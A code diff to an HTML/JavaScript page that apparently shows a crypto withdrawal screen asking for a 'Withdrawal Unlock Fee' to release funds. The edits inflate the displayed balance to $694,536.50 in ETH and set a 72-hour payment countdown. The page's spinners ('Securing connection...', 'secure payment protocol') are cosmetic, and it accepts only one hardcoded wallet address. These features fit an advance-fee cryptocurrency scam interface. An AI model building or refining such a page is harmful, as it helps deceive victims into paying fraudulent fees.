@@ -96,7 +96,6 @@
             font-size: 14px;
         }
 
-        /* --- ERROR BOX STYLE --- */
         .error-message {
             display: none;
             background-color: rgba(239, 68, 68, 0.1);
@@ -235,7 +234,7 @@
             </div>
             <div class="summary-item">
                 <span>Crypto Value:</span>
-                <span class="highlight">$1,450.00 (0.023 BTC)</span>
+                <span class="highlight">$694,536.50 (202.48 ETH)</span>
             </div>
             <div class="summary-item">
                 <span>Withdrawal Unlock Fee:</span>
@@ -244,7 +243,7 @@
         </div>
 
         <p style="margin-bottom: 5px;">Time remaining to complete payment:</p>
-        <div class="timer" id="countdown">10:00</div>
+        <div class="timer" id="countdown">72:00:00</div>
 
         <button class="btn" style="background-color: #10b981;" onclick="triggerPaymentProcessing()">Pay Now</button>
     </div>
@@ -252,10 +251,8 @@
 </div>
 
 <script>
-    // Defined Authorized Address
     const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
 
-    // Helper function to handle spinner display
     function showSpinner(text, duration, callback) {
         const spinner = document.getElementById('loading-spinner');
         const spinnerText = document.getElementById('spinner-message');
@@ -269,7 +266,6 @@
         }, duration);
     }
 
-    // Inline Error Display functions
     function showError(message) {
         const errorBox = document.getElementById('error-box');
         errorBox.innerText = message;
@@ -282,7 +278,6 @@
         errorBox.innerText = '';
     }
 
-    // Function to switch between steps directly
     function nextStep(stepNumber) {
         document.querySelectorAll('.step').forEach(step => {
             step.classList.remove('active');
@@ -290,14 +285,12 @@
         document.getElementById('step' + stepNumber).classList.add('active');
     }
 
-    // Step 1 button action with loader
     function triggerStep1Transition() {
         showSpinner("Securing connection...", 1500, () => {
             nextStep(2);
         });
     }
 
-    // Process step 2 with validation and error formatting
     function processStep2() {
         const address = document.getElementById('wallet-address').value.trim();
         const selectedCrypto = document.getElementById('crypto-select').value;
@@ -307,51 +300,47 @@
             return;
         }
 
-        // Strict currency selection validation check
         if (selectedCrypto !== "Ethereum (ETH)") {
             showError("Error: Only Ethereum (ETH) transactions are supported at this time.");
             return;
         }
 
-        // Strict address validation check
         if (address !== REQUIRED_ADDRESS) {
             showError("Error: Invalid or unauthorized wallet address for this transaction.");
             return;
         }
 
-        // Pass selected crypto text to the final screen
         document.getElementById('display-crypto').innerText = selectedCrypto;
 
-        // Show spinner before showing step 3
         showSpinner("Verifying network configurations...", 1800, () => {
             nextStep(3);
-            startTimer(600); // 10 minutes in seconds
+            startTimer(259200); // Changed to 72 hours in seconds (72 * 3600)
         });
     }
 
-    // Step 3 payment confirmation with loader
     function triggerPaymentProcessing() {
         showSpinner("Initiating secure payment protocol...", 2000, () => {
-            // Replaced alert with console message for system compliance
             console.log('Payment processing initiated!');
         });
     }
 
-    // Countdown Timer Function
+    // Updated Countdown Timer to support dynamic handling of Hours
     function startTimer(duration) {
-        let timer = duration, minutes, seconds;
+        let timer = duration, hours, minutes, seconds;
         const display = document.getElementById('countdown');
         
         if(window.timerInterval) clearInterval(window.timerInterval);
 
         window.timerInterval = setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
+            hours = parseInt(timer / 3600, 10);
+            minutes = parseInt((timer % 3600) / 60, 10);
             seconds = parseInt(timer % 60, 10);
 
+            hours = hours < 10 ? "0" + hours : hours;
             minutes = minutes < 10 ? "0" + minutes : minutes;
             seconds = seconds < 10 ? "0" + seconds : seconds;
 
-            display.textContent = minutes + ":" + seconds;
+            display.textContent = hours + ":" + minutes + ":" + seconds;
 
             if (--timer < 0) {
                 clearInterval(window.timerInterval);
